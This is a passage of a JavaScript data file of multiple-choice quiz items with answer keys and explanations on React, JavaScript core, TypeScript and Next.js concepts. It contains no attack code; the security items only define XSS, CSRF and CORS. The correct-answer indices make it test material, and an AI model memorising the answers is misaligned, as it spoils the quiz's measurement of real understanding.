    { q: "What is memoization?", opts: ["Writing comments", "Caching function return values — same input returns cached result without recomputing", "Memory optimization", "Garbage collection"], correct: 1, explain: "Memoization: cache results keyed by arguments. Same args = return cached value instantly. Only works for pure functions. Used in useMemo (expensive computations), useCallback (stable function references), React.memo (component re-renders)." },
  ],
  'rf-hydration': [
    { q: "What is hydration?", opts: ["Adding water to data", "React attaching event listeners to server-rendered HTML, making it interactive", "Loading CSS", "Fetching initial data"], correct: 1, explain: "Hydration: React takes server-rendered static HTML and attaches event listeners and React state. React 'hydrates' existing DOM rather than creating from scratch. Mismatch between server/client render = hydration error." },
  ],
  'rf-reconciliation': [
    { q: "What is reconciliation?", opts: ["Managing conflicts", "React's algorithm to diff new virtual DOM against previous and compute minimal real DOM changes", "Handling errors", "Managing state"], correct: 1, explain: "Reconciliation: React builds new virtual DOM tree, diffs against previous, applies only actual changes to real DOM. Key prop helps React identify list items to avoid unnecessary recreations." },
  ],
  'rf-lazy-loading': [
    { q: "What is lazy loading?", opts: ["Loading slowly", "Deferring resource loading until needed — images, routes, components load only when required", "Background loading", "Preloading resources"], correct: 1, explain: "Lazy loading defers downloads. Images: loading='lazy'. Components: React.lazy(). Routes: dynamic import(). Reduces initial load size — users only download what they actually need." },
  ],
  'rf-tree-shaking': [
    { q: "What is tree shaking?", opts: ["Removing CSS", "Bundler eliminates unused exports via static analysis of ES module import/export — dead code removal", "Optimizing images", "Splitting bundles"], correct: 1, explain: "Tree shaking: bundler analyzes which exports are actually imported. Unused code is 'shaken off'. Requires ES module syntax. import _ from 'lodash' prevents tree shaking — use named imports." },
  ],
  'rf-ssr': [
    { q: "What is SSR?", opts: ["Single Source Reality", "Server-Side Rendering — HTML generated on server per request. Good for SEO and fast FCP.", "Synchronized State Rendering", "Streaming Server Routing"], correct: 1, explain: "SSR: server generates complete HTML per request. Browser receives full HTML immediately — good for SEO and First Contentful Paint. JavaScript hydrates for interactivity afterward." },
  ],
  'rf-csr': [
    { q: "What is CSR?", opts: ["Cached Static Resources", "Client-Side Rendering — HTML built in browser via JS. Fast navigation, slow initial load.", "Component State Rendering", "Core Static Resources"], correct: 1, explain: "CSR: server sends minimal HTML + JS bundle. Browser runs React, builds DOM. Slow initial load (blank page until JS runs) but fast navigation. Poor SEO without SSR." },
  ],
  'rf-auth-authz': [
    { q: "Authentication vs authorization?", opts: ["Same", "Authentication: who are you? (verify identity). Authorization: what can you do? (check permissions).", "Authorization comes first", "Auth is server-side only"], correct: 1, explain: "Authenticate first (login → verify identity → token), then authorize (check if this user has permission for this action). Both required — authentication without authorization = anyone can do anything." },
  ],
  'rf-cors': [
    { q: "What is CORS?", opts: ["A vulnerability", "Browser mechanism controlling cross-origin requests — servers declare allowed origins via response headers", "A language", "An HTTP method"], correct: 1, explain: "CORS: when JS makes request to different origin, browser checks Access-Control-Allow-Origin header. If origin not listed, browser blocks reading the response. Protects users from malicious cross-origin data access." },
  ],
  'rf-xss': [
    { q: "What is XSS?", opts: ["Extra Style Sheets", "Cross-Site Scripting — attacker injects malicious scripts that execute in victims' browsers", "A framework", "A type of SQL injection"], correct: 1, explain: "XSS: inject script into page viewed by other users. Script runs in victims' browsers with full page permissions. Prevention: textContent instead of innerHTML, CSP headers, DOMPurify sanitization." },
  ],
  'rf-csrf': [
    { q: "What is CSRF?", opts: ["A JavaScript error", "Cross-Site Request Forgery — tricks authenticated users into unintended requests via automatic cookie attachment", "Caching strategy", "Rendering pattern"], correct: 1, explain: "CSRF: user logged into bank.com. evil.com makes request to bank.com. Browser auto-attaches bank.com cookies → bank authenticates it. Fix: SameSite=Strict/Lax cookies, CSRF tokens." },
  ],
  'rf-optimistic-ui': [
    { q: "What is optimistic UI?", opts: ["Always showing success", "Update UI immediately before server confirms, roll back if it fails", "Caching UI state", "Preloading components"], correct: 1, explain: "Optimistic: user likes post → immediately show +1, flip button — before API responds. If request fails, roll back + show error. Creates instant-feeling interactions without waiting for server." },
  ],
  'rf-virtualization': [
    { q: "What is virtualization?", opts: ["Running in a VM", "Only render visible list items — fixed DOM node count regardless of total list size", "CSS virtual layout", "SSR optimization"], correct: 1, explain: "Virtualization: 10,000 items but only ~20 DOM nodes exist. Items are absolutely positioned — visible window moves over data as you scroll. Libraries: TanStack Virtual, react-window." },
  ],
  'rf-code-splitting': [
    { q: "What is code splitting?", opts: ["Breaking CSS", "Breaking JS bundle into chunks that load on demand — routes/components only downloaded when needed", "Splitting servers", "Team responsibilities"], correct: 1, explain: "Code splitting: React.lazy(() => import('./Dashboard')) — Dashboard's code only downloads when user navigates to it. Users never download code for routes they never visit." },
  ],


  // ── JS Core missing quizzes ──────────────────────────────────────────
  'hoisting': [
    { q: "What does this print?\nconsole.log(foo);\nvar foo = 'bar';", opts: ["'bar'", "undefined", "ReferenceError", "null"], correct: 1, explain: "var declarations are hoisted and initialized to undefined before any code runs. The assignment stays in place. So console.log sees foo as undefined, not 'bar'." },
    { q: "What does this print?\nconsole.log(foo);\nlet foo = 'bar';", opts: ["undefined", "'bar'", "ReferenceError: Cannot access 'foo' before initialization", "null"], correct: 2, explain: "let is hoisted but NOT initialized — it sits in the Temporal Dead Zone. Accessing it before the declaration line throws ReferenceError, unlike var which gives undefined." },
    { q: "What is fully hoisted — meaning both declaration AND definition move to the top?", opts: ["var declarations", "Function declarations: function foo() {}", "let/const declarations", "Class declarations"], correct: 1, explain: "Function declarations (function foo() {}) are fully hoisted — both the name and the body. You can call foo() before its definition. Function expressions (const foo = function(){}) only hoist the var declaration as undefined." },
    { q: "What is the Temporal Dead Zone?", opts: ["Memory that has been freed", "The zone between when let/const is hoisted and when it's initialized — accessing throws ReferenceError", "A scope boundary for closures", "Variables declared with var inside blocks"], correct: 1, explain: "TDZ: let/const ARE hoisted (the engine registers them), but they're not initialized until the declaration line executes. Between the start of the scope and the declaration = TDZ. This makes let/const behave more predictably than var." },
    { q: "What does this print?\nfoo();\nfunction foo() { console.log('hello'); }", opts: ["ReferenceError", "TypeError", "'hello'", "undefined"], correct: 2, explain: "Function declarations are fully hoisted — the entire function body moves to the top of the scope. foo() can be called before the definition appears in the code and it works perfectly." },
  ],

  'coercion': [
    { q: "What does '' == false evaluate to?", opts: ["false — different types", "true — both coerce to 0", "TypeError", "undefined"], correct: 1, explain: "Loose equality coercion chain: false → 0 (boolean to number), '' → 0 (string to number). 0 == 0 → true. This is exactly why === is preferred — '' === false is false as expected." },
    { q: "What does typeof null return?", opts: ["'null'", "'undefined'", "'object'", "'boolean'"], correct: 2, explain: "typeof null === 'object' is a 30-year-old JavaScript bug kept for backward compatibility. Always check null explicitly: x === null, never typeof x === 'object'." },
    { q: "What is the result of 1 + '2'?", opts: ["3", "'12'", "NaN", "TypeError"], correct: 1, explain: "When + has a string operand, JS coerces the other to string. 1 becomes '1', then '1' + '2' = '12'. This is string concatenation, not addition. Use Number(x) or parseInt(x) to be explicit." },
    { q: "What does Number('') return?", opts: ["NaN", "undefined", "0", "''"], correct: 2, explain: "Number('') === 0. Empty string coerces to 0 in numeric context. This catches many developers off guard. Number(' ') also returns 0 (whitespace-only strings). Number('a') returns NaN." },
    { q: "What does [] == ![] evaluate to?", opts: ["false", "true", "TypeError", "undefined"], correct: 1, explain: "![] = false (array is truthy, negated = false). [] == false: [] → '' → 0, false → 0. 0 == 0 = true. This is a famous coercion trap — the reason to always use === in real code." },
    { q: "What is the correct way to check if a value is NaN?", opts: ["value === NaN", "value == NaN", "Number.isNaN(value)", "isNaN(value)"], correct: 2, explain: "NaN !== NaN — NaN is the only value not equal to itself. isNaN('hello') returns true (coerces first). Number.isNaN() does NO coercion: Number.isNaN('hello') = false. Always use Number.isNaN()." },
  ],

  'memory': [
    { q: "What is the difference between the stack and the heap in JavaScript?", opts: ["Stack is larger", "Stack: primitives and references (fixed size, fast, LIFO). Heap: objects and functions (dynamic size, managed by GC).", "Heap is for synchronous code", "Stack handles async code"], correct: 1, explain: "Stack stores: primitive values (number, string, boolean) and references (pointers to heap objects). Fast access, automatically managed. Heap stores: objects, arrays, functions — dynamically sized. GC determines when to free heap memory." },
    { q: "What is the most common cause of memory leaks in JavaScript?", opts: ["Using too many variables", "Unintentional global variables, forgotten event listeners, closures holding large references, detached DOM nodes", "Using async/await", "Recursive functions"], correct: 1, explain: "Common leaks: 1) Accidental globals (x = 1 without var/let). 2) Event listeners never removed. 3) Closures closing over large data unnecessarily. 4) DOM nodes removed but still referenced in JS variables. All keep objects reachable, preventing GC." },
    { q: "Why does WeakMap prevent memory leaks compared to Map?", opts: ["WeakMap is faster", "WeakMap keys are weakly referenced — when the key object has no other references, GC can collect it and the entry auto-removes", "WeakMap uses less memory per entry", "WeakMap doesn't store values"], correct: 1, explain: "Map holds strong references to keys — objects in a Map are never collected. WeakMap holds weak references — if the key object is only referenced by the WeakMap, GC collects it and the entry disappears. Perfect for caches and private data without manual cleanup." },
    { q: "What does the mark-and-sweep garbage collection algorithm do?", opts: ["Frees memory in order of allocation", "Marks all objects reachable from roots (global, stack), then sweeps (frees) everything not marked", "Counts references and frees when count reaches 0", "Compacts memory to eliminate fragmentation"], correct: 1, explain: "Mark phase: start from GC roots (globals, call stack), follow all references, mark every reachable object. Sweep phase: free everything that wasn't marked. This handles circular references — circular objects are collected if not reachable from roots." },
    { q: "What is a memory leak in the context of event listeners?", opts: ["Too many listeners cause crashes", "Adding listeners to DOM elements then removing the elements without removing listeners — the element and its closure references stay in memory", "Event listeners run too slowly", "Async listeners never complete"], correct: 1, explain: "element.addEventListener('click', handler) — handler may close over large data. If the element is removed from DOM but the handler still references it, both stay in memory. Fix: always removeEventListener or use AbortController to clean up listeners." },
  ],

  'this-keyword': [
    { q: "What does this print?\nconst obj = { val: 42, fn: function() { return this.val; } };\nconst f = obj.fn;\nconsole.log(f());", opts: ["42", "undefined", "TypeError", "null"], correct: 1, explain: "Method extracted from object loses its binding. f() is a standalone call — default binding applies. In strict mode this=undefined (TypeError). In sloppy mode this=window, window.val=undefined. The implicit obj binding is lost when the function is detached." },
    { q: "What does this print?\nconst obj = { val: 10, fn: () => this.val };\nconsole.log(obj.fn());", opts: ["10", "undefined", "TypeError", "null"], correct: 1, explain: "Arrow functions capture 'this' lexically from where they are DEFINED — the enclosing scope when the object literal is created. In a module, that's undefined. In a browser script it's window. The implicit obj binding is completely ignored for arrow functions." },
    { q: "Which binding rule has the highest priority?", opts: ["Implicit binding (obj.fn())", "new binding", "Explicit binding (call/apply/bind)", "Default binding"], correct: 1, explain: "Priority: new > explicit (call/apply/bind) > implicit (method call) > default. new creates a fresh object. Explicit overrides implicit. Default is the fallback when no other rule applies." },
    { q: "What does fn.bind(obj)(arg) do?", opts: ["Calls fn with arg and returns a new function", "Returns a new function permanently bound to obj — calling it with any context won't change this", "Same as fn.call(obj, arg)", "Creates a copy of fn"], correct: 1, explain: "fn.bind(obj) returns a NEW function where this is permanently fixed to obj. Even if you call the bound function with .call(other), this stays as obj. bind doesn't invoke the function — it returns a bound version you can call later." },
    { q: "How do you fix 'this' loss in a class method passed as callback?", opts: ["Use var instead of const", "Arrow class field: handleClick = () => {} or bind in constructor: this.method = this.method.bind(this)", "Add 'use strict' at top", "Use a regular function instead"], correct: 1, explain: "Arrow class fields: handleClick = () => { this.state } — 'this' is lexically bound to the class instance, never lost. Constructor bind: this.handleClick = this.handleClick.bind(this) — creates a permanently bound copy. Both work. Arrow fields are more concise." },
  ],

  'async-await': [
    { q: "What does async function always return?", opts: ["The value it returns", "A Promise — even if you return a plain value, it's wrapped in Promise.resolve()", "undefined if no return", "Depends on what you return"], correct: 1, explain: "async function foo() { return 42; } — calling foo() returns Promise.resolve(42), not 42. This is fundamental: async/await is syntactic sugar over Promises. The function's return value is always a resolved Promise." },
    { q: "What is wrong with: async function fetchAll() { const a = await fetchA(); const b = await fetchB(); }?", opts: ["Nothing — this is correct", "Requests run sequentially — fetchB waits for fetchA to complete. Use Promise.all for parallel.", "await can't be used twice", "fetchB never runs"], correct: 1, explain: "Sequential awaits are a common performance mistake. fetchB only starts after fetchA finishes — total time = timeA + timeB. Fix: const [a, b] = await Promise.all([fetchA(), fetchB()]) — both start simultaneously, total time = max(timeA, timeB)." },
    { q: "What is the correct way to handle errors in async/await?", opts: ["Promises don't need error handling", "Wrap in try/catch: try { const d = await fetch(); } catch(e) { handle(e); }", "Use .then().catch() only", "async functions never throw"], correct: 1, explain: "try/catch with async/await catches both synchronous throws and rejected Promises. Without try/catch, rejected Promises become unhandled rejections. You can also add .catch() to the awaited promise: await fetch().catch(handleError)." },
    { q: "What does Promise.allSettled return compared to Promise.all?", opts: ["Same result", "allSettled: always resolves with array of {status, value/reason} for ALL promises. Promise.all: rejects immediately if any promise rejects.", "allSettled is faster", "allSettled only handles rejections"], correct: 1, explain: "Promise.all: fail-fast — one rejection = everything rejects. Promise.allSettled: waits for all, returns [{status:'fulfilled',value:x}, {status:'rejected',reason:e}]. Use allSettled when you need all results regardless of failures." },
    { q: "What is async/await syntactic sugar for?", opts: ["Callbacks", "Promise chains with .then()/.catch()", "setTimeout", "Generator functions with yield"], correct: 1, explain: "async/await compiles to Promise chains. async function foo() { const x = await bar(); return x+1; } is equivalent to bar().then(x => x+1). The await keyword pauses execution and schedules the rest as a .then() microtask." },
  ],

  'scope-chain': [
    { q: "What is the scope chain?", opts: ["A linked list of closures", "The chain of lexical environments from current scope up to global scope — how JS resolves variable lookups", "A prototype chain for variables", "The call stack order"], correct: 1, explain: "Scope chain: when a variable is referenced, JS looks in current scope first, then outer scope, then outer-outer, up to global. Each function creates a new scope link. Closures work because inner functions hold a reference to their outer scope's environment." },
    { q: "What is lexical scope?", opts: ["Scope determined at runtime", "Scope determined at WRITE time — where you write a function determines its scope, not where it's called", "Scope of the global object", "Dynamic scope based on call stack"], correct: 1, explain: "JavaScript uses lexical (static) scope: a function's scope is determined by where it's written in the source code, not where it's called from. This is the foundation of closures — the inner function 'remembers' the scope where it was defined." },
    { q: "What is the difference between block scope and function scope?", opts: ["No difference", "Block scope: limited to { } blocks (let/const). Function scope: limited to the function body (var).", "var is block-scoped", "let is function-scoped"], correct: 1, explain: "var leaks out of blocks: if (true) { var x = 1; } console.log(x) // 1 (x is visible outside). let/const: if (true) { let y = 1; } console.log(y) // ReferenceError (y is block-scoped). Always use let/const to avoid var scope leaks." },
    { q: "What does this print?\nlet x = 'global';\nfunction outer() {\n  let x = 'outer';\n  function inner() { console.log(x); }\n  inner();\n}\nouter();", opts: ["'global'", "'outer'", "ReferenceError", "undefined"], correct: 1, explain: "Scope chain lookup: inner() looks for x in its own scope (not found), then outer's scope (found: 'outer'). It stops at the first match. The global x is shadowed by outer's x. This is variable shadowing via the scope chain." },
  ],

  'generators-adv': [
    { q: "What is an async generator function?", opts: ["An async function that returns a generator", "A function declared with async function* that can use both await and yield — produces async iterable sequences", "A generator that calls async functions", "Same as a regular generator"], correct: 1, explain: "async function* asyncGen() { yield await fetch('/1'); yield await fetch('/2'); } — combines async/await with generators. Each yield produces a promise. Used with for await...of to iterate async data streams like paginated APIs or file chunks." },
    { q: "What does yield* do in a generator?", opts: ["Yields a Promise", "Delegates to another iterable — yields each value of the inner iterable one by one", "Returns from the generator", "Creates infinite sequences"], correct: 1, explain: "yield* delegates iteration: function* gen() { yield* [1,2,3]; yield 4; } — yields 1, then 2, then 3 (from array), then 4. Works with any iterable including arrays, strings, Sets, Maps, and other generators. Composes generators cleanly." },
    { q: "How do you pass a value INTO a generator via next()?", opts: ["You can't pass values into generators", "Pass as argument to next(): gen.next(value) — value becomes the result of the yield expression inside the generator", "Use generator.send()", "Via closure only"], correct: 1, explain: "function* adder() { const x = yield 'give me a number'; yield x * 2; } const g = adder(); g.next(); // {value:'give me a number'} g.next(5); // {value:10} — 5 is passed in as the result of the yield expression." },
    { q: "What real-world problem do generators solve elegantly?", opts: ["Replacing all Promises", "Infinite sequences and lazy evaluation — generate values on demand without computing everything upfront", "Replacing event listeners", "HTTP requests"], correct: 1, explain: "Generators shine for: infinite sequences (IDs, pagination), lazy evaluation (don't compute until consumed), custom iterables, coroutines (cooperative multitasking). function* infiniteId() { let id=0; while(true) yield id++; } — never runs out, never pre-computes." },
  ],

  // ── TypeScript missing quizzes ──────────────────────────────────────
  'ts-basics': [
    { q: "What is the key difference between interface and type in TypeScript?", opts: ["They are identical", "interface: can be merged/extended with same name (declaration merging). type: can create unions, intersections, mapped types — more flexible for complex type expressions.", "type is newer and replaces interface", "interface is only for classes"], correct: 1, explain: "interface Point { x: number } interface Point { y: number } — merges to {x, y}. type can't do this. But type is more powerful for: union types (type ID = string | number), mapped types, conditional types. Common rule: interface for public APIs (extendable), type for everything else." },
    { q: "Can a type alias use extends?", opts: ["No — only interface uses extends", "Yes — via intersection: type AdminUser = User & { adminLevel: number }", "Only with classes", "Only in TypeScript 5+"], correct: 1, explain: "type uses & (intersection) for extension: type Admin = User & { role: 'admin' }. interface uses extends: interface Admin extends User { role: 'admin' }. Both produce the same shape, different syntax. Intersections are more flexible — you can intersect multiple types inline." },
    { q: "What does declaration merging mean for interfaces?", opts: ["Interfaces can inherit from each other", "Two interfaces with the same name in the same scope automatically merge their members", "Interface properties are overwritten on redeclaration", "Only classes support merging"], correct: 1, explain: "interface Request { body: string } interface Request { user: User } — TypeScript merges them into one interface with both body and user. This is how libraries (Express, etc.) extend built-in types without modifying originals. type aliases don't support this." },
    { q: "When should you prefer interface over type?", opts: ["Always — interface is better", "When defining object shapes that others will extend (public APIs, library types). When you need declaration merging. Otherwise type is equally fine.", "Only for class definitions", "When you need union types"], correct: 1, explain: "Official TypeScript guidance: prefer interface for object types (it gives better error messages and supports merging). Use type for: union types, tuple types, function types, mapped types, conditional types — things interface can't do." },
  ],

  'ts-generics': [
    { q: "What does <T extends object> do in a generic constraint?", opts: ["T must be exactly object type", "T can be any type that is assignable to object — primitives are excluded", "T must be a class instance", "T must have a specific shape"], correct: 1, explain: "Constraints restrict what T can be. <T extends object> means T must be an object type (not number, string, boolean). <T extends { id: number }> means T must have at least an id: number property — you can access T.id safely inside the function." },
    { q: "What does the infer keyword do in conditional types?", opts: ["Infers the type at runtime", "Extracts a type from within a conditional type — let TypeScript figure out a type within a condition", "Makes types optional", "Removes undefined from a type"], correct: 1, explain: "type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never — infer R captures the return type. TypeScript fills in R when the condition matches. Used to extract inner types: array element type, promise resolution type, function parameters." },
    { q: "What does type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never do?", opts: ["Gets the first argument type", "Extracts the return type of a function type T", "Makes the function return undefined", "Counts the arguments"], correct: 1, explain: "If T is a function type, infer R captures whatever R is in the return position. ReturnType<() => string> = string. ReturnType<typeof fetch> = Promise<Response>. TypeScript's built-in ReturnType utility type uses exactly this pattern." },
    { q: "What is a generic default and when is it useful?", opts: ["A default value for the generic", "function create<T = string>() — T defaults to string if not specified. Useful for library functions where the common case has a known type.", "A fallback value at runtime", "Only for class generics"], correct: 1, explain: "Generic defaults: function createStore<S = {}>() — caller can specify S or let it default to {}. Container<T = string> — Container is Container<string> by default. Reduces boilerplate for the common case while keeping full flexibility when needed." },
  ],

  'ts-utility': [
    { q: "What does Partial<User> do?", opts: ["Makes all User properties required", "Makes all User properties optional — every property becomes optional (?)", "Removes all User properties", "Makes User read-only"], correct: 1, explain: "Partial<{name: string, age: number}> = {name?: string, age?: number}. Useful for update functions where you only pass changed fields. Implemented as: type Partial<T> = { [K in keyof T]?: T[K] }." },
    { q: "What does Pick<User, 'name' | 'email'> produce?", opts: ["A User without name and email", "A new type with ONLY name and email from User", "Marks name and email as required", "Makes name and email readonly"], correct: 1, explain: "Pick selects specific properties: Pick<{id:number, name:string, email:string, age:number}, 'name'|'email'> = {name:string, email:string}. Useful for creating view models or passing only needed data to components." },
    { q: "What is the difference between Omit and Exclude?", opts: ["They are the same", "Omit works on object types (removes keys). Exclude works on union types (removes members).", "Exclude removes from objects", "Omit works on unions"], correct: 1, explain: "Omit<User, 'password'> removes a key from an object type — result is User without password. Exclude<'a'|'b'|'c', 'a'> removes from a union — result is 'b'|'c'. Different tools for different problems." },
    { q: "What does Record<string, number> represent?", opts: ["An array of numbers", "An object with string keys and number values: { [key: string]: number }", "A Map from string to number", "A tuple of string and number"], correct: 1, explain: "Record<K, V> creates an object type with keys K and values V. Record<string, number> = {[key: string]: number}. Record<'red'|'green'|'blue', string> forces exactly those three keys with string values — more precise than a plain object type." },
    { q: "What does Required<Partial<T>> equal?", opts: ["The same as Partial<T>", "T itself — Required makes all optional properties required, reversing Partial", "An empty type", "Depends on T"], correct: 1, explain: "Required<T> makes every optional property required. Partial makes all required properties optional. Required<Partial<T>> = T (back to original). Useful to understand how utility types compose and cancel out." },
  ],

  'ts-advanced': [
    { q: "What is the difference between any and unknown?", opts: ["They are identical", "any: disables type checking entirely. unknown: forces you to narrow the type before using it — type-safe top type.", "unknown is deprecated", "any is only for function parameters"], correct: 1, explain: "any: you can do anything — no checking. unknown: you MUST check the type before using it: if (typeof x === 'string') x.toUpperCase(). unknown is the type-safe version of any. Use unknown for values from external sources (JSON.parse, API responses) where type is uncertain." },
    { q: "What is the never type used for?", opts: ["Variables that are never assigned", "Represents the empty type / impossible cases — return type of functions that never return, exhaustive checks in switch statements", "Null and undefined combined", "A type that accepts no values"], correct: 1, explain: "never appears in: 1) Functions that always throw or loop forever: function fail(): never { throw new Error() }. 2) Exhaustive checks: in a switch after handling all cases, the default branch has type never — TypeScript guarantees it's unreachable. 3) Intersection of incompatible types: string & number = never." },
    { q: "When should you use unknown instead of any?", opts: ["Never — any is always better", "When receiving data from external sources (API, JSON.parse, user input) — unknown forces type narrowing before use, preventing runtime errors", "Only in catch blocks", "Only for function return types"], correct: 1, explain: "function parseJSON(input: string): unknown — caller must narrow type before using. This is correct: API responses, JSON, external data could be anything. any would let callers use the result without any checks, hiding bugs. TypeScript 4+ uses unknown for catch error by default with useUnknownInCatchVariables." },
    { q: "What does a function with return type never mean?", opts: ["It returns undefined", "It NEVER returns — either always throws, or has an infinite loop", "It's an async function", "It returns null"], correct: 1, explain: "function throwError(msg: string): never { throw new Error(msg); } — after calling throwError(), TypeScript knows execution never continues. Used in: error utilities, exhaustive type checks (assertNever), infinite servers/loops. Different from void (returns undefined) or undefined (can return or not)." },
  ],

  'ts-guards': [
    { q: "What is a type guard?", opts: ["A function that blocks invalid types", "Code that narrows a type within a conditional block — TypeScript understands the type is more specific after the check", "A TypeScript decorator", "A runtime type validator"], correct: 1, explain: "Type guards narrow types: if (typeof x === 'string') { /* TypeScript knows x is string here */ }. Inside the if block, x is treated as string, not string|number. Guards include: typeof, instanceof, in operator, equality checks, and user-defined guards." },
    { q: "What is a user-defined type guard (type predicate)?", opts: ["A function with if statements", "A function returning 'param is Type' — tells TypeScript: if this returns true, narrow param to Type", "A TypeScript interface", "A generic constraint"], correct: 1, explain: "function isUser(x: unknown): x is User { return typeof x === 'object' && x !== null && 'id' in x; } — the 'x is User' return type is a type predicate. When this function returns true, TypeScript narrows x to User in the calling context." },
    { q: "What is a discriminated union and how does TypeScript narrow it?", opts: ["A union of unrelated types", "A union where each member has a common literal property — TypeScript uses that property to narrow the type in switch/if", "A union that TypeScript can't narrow", "Only for class types"], correct: 1, explain: "type Shape = {kind:'circle', radius:number} | {kind:'rect', width:number}. Checking shape.kind === 'circle' narrows to the circle variant — TypeScript knows radius exists. This is the most powerful and maintainable narrowing pattern — always add a discriminant literal to union types." },
    { q: "What does the in operator do for type narrowing?", opts: ["Checks if a value is in an array", "Narrows type by checking if a property exists on an object: 'swim' in animal narrows Animal to Fish if Fish has swim", "Checks array membership", "Equivalent to hasOwnProperty"], correct: 1, explain: "if ('swim' in animal) { animal.swim() } — if Fish has swim and Bird doesn't, TypeScript narrows animal to Fish inside this block. Useful for discriminating union types when there's no common literal discriminant property." },
  ],

  'ts-mapped': [
    { q: "What does a mapped type do?", opts: ["Maps over an array", "Iterates over the keys of a type and transforms them: { [K in keyof T]: NewType }", "Creates a dictionary", "Maps function arguments"], correct: 1, explain: "Mapped types iterate over keys: type ReadOnly<T> = { readonly [K in keyof T]: T[K] } — creates a new type where every property of T is readonly. type Optional<T> = { [K in keyof T]?: T[K] } — makes all properties optional. This is how Partial, Required, Readonly are implemented." },
    { q: "What are template literal types?", opts: ["Strings with ${} in types", "Types built by combining string literal types: type EventName = `on${string}` — matches 'onClick', 'onChange', any 'on...' string", "Template strings at runtime", "A way to format type names"], correct: 1, explain: "type Direction = 'left'|'right'; type CSS = `margin-${Direction}` = 'margin-left'|'margin-right'. TypeScript generates all combinations. Powerful for: event names, CSS properties, API routes, action type strings — creates precise string types." },
    { q: "What is a conditional type?", opts: ["An if statement in types", "T extends U ? X : Y — if T is assignable to U, the type is X, otherwise Y", "A type that can be null", "An optional type"], correct: 1, explain: "type NonNullable<T> = T extends null|undefined ? never : T — removes null and undefined from T. NonNullable<string|null> = string. Conditional types can be combined with infer to extract inner types. They're evaluated distributively over union types." },
    { q: "How do you make a mapped type that only includes string-valued properties?", opts: ["type StringProps<T> = Pick<T, string>", "type StringProps<T> = { [K in keyof T as T[K] extends string ? K : never]: T[K] }", "Filter<T, string>", "Not possible in TypeScript"], correct: 1, explain: "Key remapping with as: [K in keyof T as T[K] extends string ? K : never] — the as clause filters keys. If the property's value type extends string, keep the key; otherwise map it to never (which removes it). Produces a type with only string-valued properties." },
  ],

  // ── React missing quizzes ──────────────────────────────────────────
  'useeffect-deep': [
    { q: "What causes an infinite loop in useEffect?", opts: ["Using setState", "Setting state in an effect without proper deps — the effect runs, updates state, causes re-render, effect runs again, repeat", "Using async functions", "Multiple useEffect calls"], correct: 1, explain: "useEffect(() => { setData(fetchedData); }, [data]) — if data is in deps and we set data inside, we re-render with new data, effect runs again, sets data again, infinite loop. Fix: use a ref flag, empty deps [], or restructure so the effect doesn't update its own dep." },
    { q: "What is the correct way to fetch data in useEffect?", opts: ["useEffect(async () => { ... })", "Define async function inside, call it immediately, return cleanup that aborts the request", "Use a Promise directly", "Set state before the async call"], correct: 1, explain: "useEffect(() => { const ctrl = new AbortController(); const run = async () => { const d = await fetch(url, {signal: ctrl.signal}); setData(d); }; run(); return () => ctrl.abort(); }, [url]) — async IIFE inside, AbortController cleanup, url in deps." },
    { q: "When should you use useLayoutEffect instead of useEffect?", opts: ["Always — useLayoutEffect is better", "When you need to read DOM measurements and update state synchronously before paint — prevents visual flicker", "For async operations", "When you have many effects"], correct: 1, explain: "useEffect runs after paint (async). useLayoutEffect runs synchronously after DOM mutations but before paint. Use useLayoutEffect when: measuring DOM element dimensions, syncing layout (tooltips, popovers that need positioning based on DOM size). useEffect is almost always correct." },
    { q: "What does the dependency array [] (empty) mean?", opts: ["Run on every render", "Run once after the first render only — equivalent to componentDidMount", "Never run the effect", "Run when any state changes"], correct: 1, explain: "[] means: run this effect once after mount, never again. The cleanup runs on unmount. Use for: one-time subscriptions, initial data fetch. But be careful — if the effect uses any values from the component, those values will be stale (stale closure). Empty deps should genuinely have no deps." },
    { q: "What is the exhaustive-deps ESLint rule and why should you follow it?", opts: ["An optional style rule", "Enforces listing all values the effect uses in the deps array — prevents stale closures and hard-to-find bugs", "A performance optimization rule", "Only relevant for large projects"], correct: 1, explain: "exhaustive-deps warns when you use a value inside useEffect but don't include it in deps. Missing deps = stale closure = effect reads old values. When the rule forces you to add a dep and the effect runs too often, the real fix is stabilizing the dep (useCallback/useMemo), not disabling the rule." },
  ],

  'context-optimization': [
    { q: "Why does every context consumer re-render when context value changes?", opts: ["Context is slow by design", "React compares context value by reference — any new object/value triggers re-renders in ALL consumers, even those using unrelated properties", "Consumers subscribe to the entire context", "Context skips shouldComponentUpdate"], correct: 1, explain: "When Provider value changes, React re-renders ALL consumers — there's no per-property subscription like in Zustand. Even <UserContext.Provider value={{user, theme}}> — changing user re-renders components that only read theme. Reference comparison, not deep equality." },
    { q: "What is context splitting?", opts: ["Breaking context files into smaller files", "Dividing one large context into multiple focused contexts — each component subscribes only to the context it needs", "Lazy loading context providers", "Code splitting for context"], correct: 1, explain: "Instead of one AppContext with user+theme+notifications, split into UserContext, ThemeContext, NotifContext. A component that only uses theme won't re-render when user changes. This is the highest-impact context optimization — done before any memoization." },
    { q: "How does memoizing the context value help?", opts: ["It doesn't help", "useMemo(() => ({user, setUser}), [user]) creates a stable reference — Provider only broadcasts a new value when user actually changes", "It makes context faster", "Only helps with large objects"], correct: 1, explain: "Without useMemo: <Ctx.Provider value={{user, setUser}}> creates a new object on EVERY render. Every render = new reference = all consumers re-render. useMemo: only creates new reference when user changes. Essential when the Provider's parent re-renders frequently." },
    { q: "What are Zustand/Jotai advantages over Context for global state?", opts: ["They are slower but more feature-rich", "Subscription model: components subscribe to specific slices and only re-render when their slice changes — no 'all consumers re-render' problem", "They automatically split context", "They use Context internally"], correct: 1, explain: "Context: ALL consumers re-render on any value change. Zustand: useStore(s => s.count) — component only re-renders when count changes. Other store changes are ignored. This is the fundamental architectural advantage — fine-grained subscriptions without manual memoization." },
  ],

  // ── Next.js missing quizzes ──────────────────────────────────────────
  'nextjs-image': [
    { q: "What does next/image do automatically that a plain <img> doesn't?", opts: ["Just adds lazy loading", "Auto-generates WebP/AVIF, resizes to exact display size, prevents CLS with reserved dimensions, lazy loads non-priority images, serves via CDN", "Only adds width/height", "Only converts to WebP"], correct: 1, explain: "next/image: 1) Converts to WebP/AVIF automatically. 2) Generates srcset for responsive sizes. 3) Lazy loads by default (except priority images). 4) Reserves space (prevents CLS). 5) Serves optimized images via Vercel CDN. A single component replaces weeks of manual optimization." },
